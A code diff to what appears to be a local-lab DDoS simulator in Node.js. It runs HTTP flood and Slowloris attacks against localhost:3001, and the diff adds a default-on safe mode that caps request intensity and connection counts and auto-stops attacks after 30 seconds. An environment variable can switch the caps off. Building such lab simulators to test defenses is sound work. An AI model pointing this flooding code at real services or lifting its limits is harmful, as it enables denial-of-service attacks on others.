@@ -3,7 +3,14 @@ const http = require('http');
 
 const TARGET_URL = 'http://localhost:3001/api/data';
 let attackInterval = null;
+let autoStopTimeout = null;
 let activeConnections = [];
+
+// Safety defaults for local lab use. These can be overridden with env vars.
+const SAFE_MODE = process.env.SIM_SAFE_MODE !== 'false';
+const MAX_HTTP_INTENSITY = parseInt(process.env.SIM_MAX_HTTP_INTENSITY, 10) || 10;
+const MAX_SLOWLORIS_CONNECTIONS = parseInt(process.env.SIM_MAX_SLOWLORIS_CONNECTIONS, 10) || 40;
+const MAX_ATTACK_DURATION_MS = parseInt(process.env.SIM_MAX_ATTACK_DURATION_MS, 10) || 30000;
 
 const modes = {
     HTTP_FLOOD: 'HTTP_FLOOD',
@@ -13,22 +20,50 @@ const modes = {
 
 let currentMode = modes.IDLE;
 
+function parsePositiveInt(raw, fallback) {
+    const value = parseInt(raw, 10);
+    return Number.isFinite(value) && value > 0 ? value : fallback;
+}
+
+function enforceLimit(value, maxLimit, label) {
+    if (!SAFE_MODE) return value;
+    if (value > maxLimit) {
+        console.log(`[SAFE MODE] ${label} capped from ${value} to ${maxLimit}`);
+        return maxLimit;
+    }
+    return value;
+}
+
+function armAutoStop() {
+    if (!SAFE_MODE) return;
+    if (autoStopTimeout) clearTimeout(autoStopTimeout);
+    autoStopTimeout = setTimeout(() => {
+        console.log(`[SAFE MODE] Auto-stopping attack after ${MAX_ATTACK_DURATION_MS / 1000}s`);
+        stopAttack();
+    }, MAX_ATTACK_DURATION_MS);
+}
+
 async function httpFlood(intensity) {
+    const safeIntensity = enforceLimit(parsePositiveInt(intensity, 10), MAX_HTTP_INTENSITY, 'HTTP intensity');
     console.log(`[ATTACK] Starting HTTP Flood - Intensity: ${intensity} requests/batch`);
+    currentMode = modes.HTTP_FLOOD;
     attackInterval = setInterval(async () => {
         const batch = [];
-        for (let i = 0; i < intensity; i++) {
+        for (let i = 0; i < safeIntensity; i++) {
             batch.push(axios.get(TARGET_URL).catch(e => {
                 // Ignore errors (expected during DDoS)
             }));
         }
         await Promise.all(batch);
     }, 100); // Send 10 batches per second
+    armAutoStop();
 }
 
 function slowloris(count) {
+    const safeCount = enforceLimit(parsePositiveInt(count, 20), MAX_SLOWLORIS_CONNECTIONS, 'Slowloris connections');
     console.log(`[ATTACK] Starting Slowloris - Opening ${count} slow connections`);
-    for (let i = 0; i < count; i++) {
+    currentMode = modes.SLOWLORIS;
+    for (let i = 0; i < safeCount; i++) {
         const options = {
             hostname: 'localhost',
             port: 3001,
@@ -54,15 +89,20 @@ function slowloris(count) {
 
         activeConnections.push({ req, interval });
     }
+    armAutoStop();
 }
 
 function stopAttack() {
     if (attackInterval) clearInterval(attackInterval);
+    if (autoStopTimeout) clearTimeout(autoStopTimeout);
+    attackInterval = null;
+    autoStopTimeout = null;
     activeConnections.forEach(c => {
         clearInterval(c.interval);
         c.req.destroy();
     });
     activeConnections = [];
+    currentMode = modes.IDLE;
     console.log('[SYSTEM] Attack Stopped.');
 }
 
@@ -113,4 +153,9 @@ function handleMenu(choice) {
 }
 
 console.log('DDoS Simulator Engine Ready.');
+if (SAFE_MODE) {
+    console.log(`[SAFE MODE] Enabled (max HTTP intensity: ${MAX_HTTP_INTENSITY}, max Slowloris connections: ${MAX_SLOWLORIS_CONNECTIONS}, auto-stop: ${MAX_ATTACK_DURATION_MS / 1000}s)`);
+} else {
+    console.log('[SAFE MODE] Disabled via SIM_SAFE_MODE=false');
+}
 showMenu();
